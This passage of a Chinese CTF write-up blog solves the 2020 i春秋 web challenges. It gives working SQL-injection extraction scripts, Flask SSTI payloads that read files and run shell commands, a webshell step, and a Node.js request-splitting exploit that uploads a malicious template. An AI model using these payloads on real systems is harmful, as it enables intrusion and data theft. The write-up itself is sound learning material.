username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>提交得到admin密码，登录得到flag</p><p>参考：<a href="http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp" target="_blank" rel="noopener">http://blog.ydspoplar.top/2020/02/24/i%E6%98%A5%E7%A7%8B%E6%96%B0%E6%98%A5%E6%8A%97%E7%96%AB%E8%B5%9B-WP/#babyphp</a></p><h3 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h3><h4 id="2-1-easysqli-copy"><a href="#2-1-easysqli-copy" class="headerlink" title="2.1 easysqli_copy"></a>2.1 easysqli_copy</h4><p>参考资料：从宽字节注入认识PDO的原理和正确使用 <a href="https://www.freebuf.com/articles/web/216336.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/216336.html</a></p><p>原理：输入的参数并没有用单引号包裹，发送数据的时候会用单引号进行了包裹，构成了宽字节注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python2</span><br><span class="line"># coding&#x3D;utf-8</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;72e089bbcaf245b2904526c4e4b0518236a6f2cf0f304d10.changame.ichunqiu.com&#x2F;?id&#x3D;&quot;</span><br><span class="line">list &#x3D; &quot;qwertyuiopasdfghjklzxcvbnm_-0123456789&#123;&#125;,&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for j in range(35):</span><br><span class="line">    for i in list:</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        # payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;table1&#39;)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; &#39;&#39;&#39;select if(((select(group_concat(fllllll4g))from(table1)) regexp &#39;^&#123;&#125;&#39;),sleep(3),null)&#39;&#39;&#39;.format(flag+i)</span><br><span class="line">        payload &#x3D; payload.encode(&#39;hex&#39;)</span><br><span class="line">        param &#x3D; &quot;1&quot; + urllib.unquote(&quot;%df&quot;) + &quot;&#39;;set @a&#x3D;0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;&quot;.format(payload)</span><br><span class="line">        param &#x3D; urllib.quote(param)</span><br><span class="line">        url1 &#x3D; url + param</span><br><span class="line">        st &#x3D; time.time()</span><br><span class="line">        r &#x3D; requests.get(url1, timeout&#x3D;100)</span><br><span class="line">        if time.time() - st &gt; 2:</span><br><span class="line">            flag&#x3D;flag+i</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            pass</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><h4 id="2-2-blacklist"><a href="#2-2-blacklist" class="headerlink" title="2.2 blacklist"></a>2.2 blacklist</h4><p>需要先利用堆叠注入查询表和字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show tables;#</span><br></pre></td></tr></table></figure><p>得到FlagHere表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;show columns from &#96;FlagHere&#96;;#</span><br></pre></td></tr></table></figure><p>得到flag字段</p><p>根据一叶飘零大佬的blog：<a href="https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/" target="_blank" rel="noopener">https://skysec.top/2019/12/13/2019-FudanCTF-Writeup/</a> 构造exp:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11&#39;; handler &#96;FlagHere&#96; open as &#96;tgt&#96;;handler &#96;tgt&#96; read next;--</span><br></pre></td></tr></table></figure><h4 id="2-3-Ezsqli"><a href="#2-3-Ezsqli" class="headerlink" title="2.3 Ezsqli"></a>2.3 Ezsqli</h4><ul><li>无in注表名 </li></ul><p>参考：聊一聊bypass information_schema  <a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p><ul><li>无union select和字段名注数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(2|(MID((select (select 1,1) &#x3D; (select * from f1ag_1s_h3r3_hhhhh limit 0,1)),1,1)&#x3D;0))</span><br><span class="line">列的数量有两个</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select count(*) from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">共有一条记录</span><br><span class="line"></span><br><span class="line">(2|(select (select 1) &#x3D; (select id from f1ag_1s_h3r3_hhhhh)))</span><br><span class="line">记录有一个字段为id&#x3D;1</span><br></pre></td></tr></table></figure><p>参考这个：<a href="https://nosec.org/home/detail/3830.html" target="_blank" rel="noopener">https://nosec.org/home/detail/3830.html</a></p><p>使用 <code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code> 来另其返回二进制字符串</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python3</span><br><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;0365e3e590804cff9ae00511314e9994c04ae9b25b574cac.changame.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    str1 &#x3D; (&#39;0123456789&#39;+string.ascii_letters+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    select &#x3D; &#39;select group_concat(table_name) from sys.x$schema_flattened_keys&#39;</span><br><span class="line">    for j in range(1,40):</span><br><span class="line">        for i in str1:</span><br><span class="line">            paylaod &#x3D; &quot;1&#x2F;**&#x2F;&amp;&amp;&#x2F;**&#x2F;(select substr((&#123;&#125;),&#123;&#125;,1))&#x3D;&#39;&#123;&#125;&#39;&quot;.format(select, j, i)</span><br><span class="line">            #print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line">            if &#39;Nu1L&#39; in r.text:</span><br><span class="line">                flag +&#x3D; i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">def exp2():</span><br><span class="line">    str1 &#x3D; (&#39;-0123456789&#39;+string.ascii_uppercase+string.ascii_lowercase+string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&#39;\\&#39;,&#39;&#39;)</span><br><span class="line">    flag &#x3D; &#39;&#39;</span><br><span class="line">    flag_table_name &#x3D; &#39;f1ag_1s_h3r3_hhhhh&#39;</span><br><span class="line">    for j in range(1,39):</span><br><span class="line">        for i in str1:</span><br><span class="line">            i &#x3D; flag+i</span><br><span class="line">            paylaod &#x3D; &quot;1&amp;&amp;((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; as json))) &lt; (select * from &#123;&#125; limit 1))&quot;.format(i,flag_table_name)</span><br><span class="line">            print(paylaod)</span><br><span class="line">            data &#x3D; &#123;</span><br><span class="line">                &#39;id&#39;: paylaod,</span><br><span class="line">            &#125;</span><br><span class="line">            r &#x3D; requests.post(url,data&#x3D;data)</span><br><span class="line"></span><br><span class="line">            if &#39;Nu1L&#39; not in r.text:</span><br><span class="line">                flag&#x3D;i</span><br><span class="line">                print(flag)</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    exp1()</span><br><span class="line">    exp2()</span><br></pre></td></tr></table></figure><h3 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h3><h4 id="3-1-Flaskapp"><a href="#3-1-Flaskapp" class="headerlink" title="3.1 Flaskapp"></a>3.1 Flaskapp</h4><p>ssti+pin码的安全机制</p><p>payload如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;想要读取的文件&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; </span><br><span class="line">或者</span><br><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;想要读取的文件&#39;).read()&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125;</span><br><span class="line">反弹shell</span><br></pre></td></tr></table></figure><p>最后的读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(os.popen(&quot;ls -al &#x2F;&quot;).read())</span><br><span class="line">print(os.popen(&quot;cat &#x2F;this_is_the_flag.txt&quot;).read())</span><br></pre></td></tr></table></figure><h4 id="3-2-easy-thinking"><a href="#3-2-easy-thinking" class="headerlink" title="3.2 easy_thinking"></a>3.2 easy_thinking</h4><p>预期解法：</p><p>先注册一个账号，然后在登录时候burp抓包，修改session，注意长度必须是32位，将session改成<code>.php</code>结尾</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225223441544.png" alt></p><p>搜索框输入一句话木马，然后访问</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200225224532369.png" alt></p><p>剩下就是绕过，参考 <a href="https://github.com/mm0r1/exploits" target="_blank" rel="noopener">https://github.com/mm0r1/exploits</a></p><p>参考资料：</p><blockquote><p><a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/</a></p><p><a href="https://www.gem-love.com/ctf/1669.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1669.html</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/" target="_blank" rel="noopener">http://p3rh4ps.top/index.php/2020/02/22/20-2-23-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b-%e5%89%8d%e4%b8%a4%e5%a4%a9-web-writeup/</a></p><p><a href="https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/" target="_blank" rel="noopener">https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/</a></p></blockquote><h3 id="3-3-Node-Game"><a href="#3-3-Node-Game" class="headerlink" title="3.3 Node Game"></a>3.3 Node Game</h3><p>太菜了，比赛的时候做不出来，赛后进行复盘学习QAQ</p><ol><li>题目给了源代码，首先进行代码审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">app.post(&#39;&#x2F;file_upload&#39;, function(req, res)&#123;</span><br><span class="line">    var ip &#x3D; req.connection.remoteAddress;</span><br><span class="line">    var obj &#x3D; &#123;</span><br><span class="line">        msg: &#39;&#39;,</span><br><span class="line">    &#125;</span><br><span class="line">    if (!ip.includes(&#39;127.0.0.1&#39;)) &#123;</span><br><span class="line">        obj.msg&#x3D;&quot;only admin&#39;s ip can use it&quot;</span><br><span class="line">        res.send(JSON.stringify(obj));</span><br><span class="line">        return </span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[0].path, function(err, data)&#123;</span><br><span class="line">        if(err)&#123;</span><br><span class="line">            obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            res.send(JSON.stringify(obj));</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;</span><br><span class="line">            var file_name &#x3D; req.files[0].originalname</span><br><span class="line">            var dir_file &#x3D; __dirname + file_path + file_name</span><br><span class="line">            if(!fs.existsSync(__dirname + file_path))&#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    fs.mkdirSync(__dirname + file_path)</span><br><span class="line">                &#125; catch (error) &#123;</span><br><span class="line">                    obj.msg &#x3D; &quot;file type error&quot;;</span><br><span class="line">                    res.send(JSON.stringify(obj));</span><br><span class="line">                    return</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            try &#123;</span><br><span class="line">                fs.writeFileSync(dir_file,data)</span><br><span class="line">                obj &#x3D; &#123;</span><br><span class="line">                    msg: &#39;upload success&#39;,</span><br><span class="line">                    filename: file_path + file_name</span><br><span class="line">                &#125; </span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                obj.msg &#x3D; &#39;upload failed&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            res.send(JSON.stringify(obj));    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>文件上传功能会首先判断IP是否来自127.0.0.1，这里就需要构造SSRF，然后是保存文件，是根据传过去的 MIME 类型和文件名生成路径的，这里控制文件类型进行目录穿越进行任意文件上传。</p><p>core路由接收q 参数然后拼接在 /source? 后面进行访问，然后会把访问结果显示出来，这里可以进行ssrf访问，但是存在过滤。nodejs版本提示是8.12.0，存在[request splitting](<a href="http://projects.webappsec.org/w/page/13246929/HTTP" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246929/HTTP</a> Request Splitting)漏洞，攻击原理可以参考这个 <a href="https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2程序在底层处理的时候会舍弃高位的字符</a>, 只保留低位的字符, 也就是说假如我们传入<code>chr(0xffa0)</code>处理后会被截断为<code>chr(0xa0)</code>，并且这个<code>0xff</code>可更换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;core&#39;, function(req, res) &#123;</span><br><span class="line">    var q &#x3D; req.query.q;</span><br><span class="line">    var resp &#x3D; &quot;&quot;;</span><br><span class="line">    if (q) &#123;</span><br><span class="line">        var url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q</span><br><span class="line">        console.log(url)</span><br><span class="line">        var trigger &#x3D; blacklist(url);</span><br><span class="line">        if (trigger &#x3D;&#x3D;&#x3D; true) &#123;</span><br><span class="line">            res.send(&quot;&lt;p&gt;error occurs!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                http.get(url, function(resp) &#123;</span><br><span class="line">                    resp.setEncoding(&#39;utf8&#39;);</span><br><span class="line">                    resp.on(&#39;error&#39;, function(err) &#123;</span><br><span class="line">                    if (err.code &#x3D;&#x3D;&#x3D; &quot;ECONNRESET&quot;) &#123;</span><br><span class="line">                     console.log(&quot;Timeout occurs&quot;);</span><br><span class="line">                     return;</span><br><span class="line">                    &#125;</span><br><span class="line">                   &#125;);</span><br><span class="line"></span><br><span class="line">                    resp.on(&#39;data&#39;, function(chunk) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                         resps &#x3D; chunk.toString();</span><br><span class="line">                         res.send(resps);</span><br><span class="line">                        &#125;catch (e) &#123;</span><br><span class="line">                           res.send(e.message);</span><br><span class="line">                        &#125;</span><br><span class="line"> </span><br><span class="line">                    &#125;).on(&#39;error&#39;, (e) &#x3D;&gt; &#123;</span><br><span class="line">                         res.send(e.message);&#125;);</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; catch (error) &#123;</span><br><span class="line">                console.log(error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        res.send(&quot;search param &#39;q&#39; missing!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>首页有一块部分接受action参数，并拼接到 template 下的目录用 pug 引擎渲染</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res) &#123;</span><br><span class="line">    var action &#x3D; req.query.action?req.query.action:&quot;index&quot;;</span><br><span class="line">    if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\&quot;) )&#123;</span><br><span class="line">        res.send(&quot;Errrrr, You have been Blocked&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;);</span><br><span class="line">    var html &#x3D; pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>利用pug文档中的包含include可以尝试读取根目录flag  参考：<a href="https://pugjs.org/zh-cn/language/includes.html" target="_blank" rel="noopener">包含 Include</a></p><ol start="3"><li>参考赵师傅的脚本发包：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">POST &#x2F;file_upload HTTP&#x2F;1.1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;--------------------------1403693673106942081532243149</span><br><span class="line">Connection: keep-alive</span><br><span class="line">cache-control: no-cache</span><br><span class="line">Host: x</span><br><span class="line">Content-Length: 292</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;test.pug&quot;</span><br><span class="line">Content-Type: &#x2F;..&#x2F;template</span><br><span class="line"></span><br><span class="line">doctype html</span><br><span class="line">html</span><br><span class="line">  head</span><br><span class="line">    style</span><br><span class="line">      include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt</span><br><span class="line"></span><br><span class="line">----------------------------1403693673106942081532243149--</span><br><span class="line"></span><br><span class="line">GET &#x2F;flag HTTP&#x2F;1.1</span><br><span class="line">Host: x</span><br><span class="line">Connection: close</span><br><span class="line">x:&#39;&#39;&#39;</span><br><span class="line">payload &#x3D; payload.replace(&quot;\n&quot;, &quot;\r\n&quot;)</span><br><span class="line">payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)</span><br><span class="line">print(payload)</span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;707e299e-f951-4d9b-ac8a-bc2c3de5a2b8.node3.buuoj.cn&#x2F;core?q&#x3D;&#39; + urllib.parse.quote(payload))</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>最后访问/?action=test得到flag</p><p>参考资料：</p><blockquote><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6462.html</a></p><p><a href="https://xz.aliyun.com/t/2894#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/2894#toc-2</a></p><p><a href="http://blog.5am3.com/2020/02/11/ctf-node1/" target="_blank" rel="noopener">http://blog.5am3.com/2020/02/11/ctf-node1/</a></p></blockquote><h4 id="3-4-EzExpress"><a href="#3-4-EzExpress" class="headerlink" title="3.4 EzExpress"></a>3.4 EzExpress</h4><p>赛后复盘写的，学习了一下JavaScript原型链污染</p><ol><li>提示<a href="http://www.zip源代码，访问下载进行审计" target="_blank" rel="noopener">www.zip源代码，访问下载进行审计</a></li></ol><p>对routes 下路由文件进行审计，开头出现merge 和 clone，存在原型链污染漏洞</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213223562.png" alt></p><p>在action路由发现只有用户为admin才能触发原型链污染</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213453879.png" alt></p><p>但是注册的时候不能带有admin</p><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318213721947.png" alt></p><ol start="2"><li><p>参考这篇文章，<a href="https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n" target="_blank" rel="noopener">https://xz.aliyun.com/t/7184#toc-11，利用javascript大小写特性进行绕过，注册adm`ı`n</a></p></li><li><p>访问action抓包，构造恶意请求,注意要设置<code>Content-Type: application/json</code></p></li></ol><p><img src="/2020/03/18/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95/image-20200318214151607.png" alt></p><ol start="4"><li>访问<code>/info</code>触发原型链，访问<code>/flag</code>下载即可</li></ol><p>参考资料：</p><blockquote><p><a href="https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" target="_blank" rel="noopener">https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p><a href="https://www.zhaoj.in/read-6462.html" target="_blank" 